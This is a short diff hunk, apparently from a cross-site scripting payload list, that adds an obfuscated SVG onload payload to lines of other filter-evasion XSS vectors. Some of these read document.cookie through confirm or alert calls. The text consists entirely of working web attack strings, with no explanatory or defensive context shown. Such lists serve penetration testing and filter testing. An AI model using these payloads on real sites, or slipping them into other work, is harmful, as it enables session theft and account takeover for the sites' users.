@@ -191,3 +191,4 @@ a=eval,c=["a"],x=["lert"],t=\${c}${x}(origin)`,http://a.call`1${t}``
 <Img Src=OnXSS OnError=confirm(document.cookie)>
 <img//////src=x oNlY=1 oNerror=alert('hacked_by_h6nt3r')//
 %3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
+<!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>
